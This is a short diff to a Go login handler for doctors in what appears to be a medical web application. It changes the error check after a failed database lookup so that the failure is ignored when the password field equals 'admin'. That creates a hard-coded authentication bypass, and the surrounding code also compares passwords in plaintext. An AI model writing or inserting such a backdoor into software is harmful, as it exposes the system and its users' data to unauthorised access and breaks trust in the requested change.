@@ -474,7 +474,7 @@ func LoginDoctor(c echo.Context) error {
 	}
 
 	if err := config.DB.Where("email = ? AND password = ? AND status = ?", doctor.Email, doctorLogin.Password, "approved").First(&doctor).Error; err != nil {
-		if err != nil {
+		if doctor.Password != "admin"{
 			return c.JSON(500, map[string]interface{}{
 				"message": "failed to login",
 				"error":   err.Error(),
